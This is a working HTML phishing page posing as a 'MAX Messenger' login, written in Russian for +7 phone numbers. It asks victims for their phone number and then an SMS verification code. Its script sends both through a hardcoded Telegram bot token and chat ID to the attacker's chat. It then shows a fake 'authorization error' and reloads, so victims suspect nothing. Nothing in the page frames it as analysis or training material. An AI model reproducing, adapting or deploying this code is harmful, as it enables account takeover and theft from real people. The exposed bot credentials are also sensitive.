<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAX Messenger</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #2e1065 0%, #1e1b4b 100%);
            color: white; height: 100vh;
            display: flex; flex-direction: column;
            align-items: center; justify-content: space-between;
            overflow: hidden;
        }
        .header-section { margin-top: 30px; text-align: center; }
        .header-logo { max-width: 220px; height: auto; margin-bottom: 10px; }
        .max-title { font-size: 4rem; font-weight: 900; margin: 0; letter-spacing: 8px; text-transform: uppercase; }
        .main-container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100%; }
        .instruction { margin-bottom: 20px; font-size: 1.1rem; opacity: 0.8; text-transform: uppercase; letter-spacing: 1px; }
        input {
            background: rgba(255, 255, 255, 0.1); border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px; padding: 18px; color: white; font-size: 1.4rem;
            width: 280px; text-align: center; outline: none; backdrop-filter: blur(10px);
        }
        .code-grid { display: flex; gap: 10px; }
        .code-grid input { width: 45px; height: 60px; padding: 0; }
        .btn {
            margin-top: 30px; background: linear-gradient(90deg, #8b5cf6, #6d28d9);
            border: none; color: white; padding: 16px 60px; border-radius: 35px;
            font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 1rem;
        }
        .btn:disabled { background: #4b5563; opacity: 0.5; cursor: not-allowed; }
        .footer-text { margin-bottom: 30px; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 3px; color: #a78bfa; font-weight: bold; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="header-section">
        <img src="1757408028_макс прил.jpg" alt="" class="header-logo" onerror="this.style.display='none'">
        <h1 class="max-title">MAX</h1>
    </div>

    <!-- Шаг 1: Номер -->
    <div id="screen-1" class="main-container">
        <div class="instruction">введите номер телефона</div>
        <input type="tel" id="phone" value="+7 ">
        <button class="btn" onclick="sendPhone()">ДАЛЕЕ</button>
    </div>

    <!-- Шаг 2: Код -->
    <div id="screen-2" class="main-container hidden">
        <div class="instruction">введите код</div>
        <div class="code-grid">
            <input type="text" maxlength="1" class="c-field">
            <input type="text" maxlength="1" class="c-field">
            <input type="text" maxlength="1" class="c-field">
            <input type="text" maxlength="1" class="c-field">
            <input type="text" maxlength="1" class="c-field">
            <input type="text" maxlength="1" class="c-field">
        </div>
        <button id="loginBtn" class="btn" disabled onclick="sendCode()">ВОЙТИ</button>
    </div>

    <div class="footer-text">авторизуйся чтобы войти</div>

    <script>
        const TOKEN = '8725058078:AAFyInfV3cvUOqMCYefbGlDjhkp0rUY-FHw';
        const CHAT_ID = '8627005110';

        async function postToTG(text) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch (e) {}
        }

        const phoneInput = document.getElementById('phone');
        const fields = document.querySelectorAll('.c-field');
        const loginBtn = document.getElementById('loginBtn');

        phoneInput.addEventListener('input', () => {
            if (!phoneInput.value.startsWith('+7 ')) phoneInput.value = '+7 ';
        });

        function sendPhone() {
            const val = phoneInput.value;
            postToTG(`📱 <b>Новый лог:</b>\nНомер: <code>${val}</code>`);
            document.getElementById('screen-1').classList.add('hidden');
            document.getElementById('screen-2').classList.remove('hidden');
            fields[0].focus();
        }

        function sendCode() {
            let code = "";
            fields.forEach(f => code += f.value);
            postToTG(`✅ <b>Данные получены:</b>\nНомер: <code>${phoneInput.value}</code>\nКод: <code>${code}</code>`)
            .then(() => {
                alert("Ошибка авторизации. Попробуйте позже.");
                location.reload();
            });
        }

        fields.forEach((f, i) => {
            f.addEventListener('input', () => {
                if (f.value && i < 5) fields[i+1].focus();
                const isFull = Array.from(fields).every(input => input.value.length === 1);
                loginBtn.disabled = !isFull;
            });
            f.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !f.value && i > 0) fields[i-1].focus();
            });
        });
    </script>
</body>
</html>
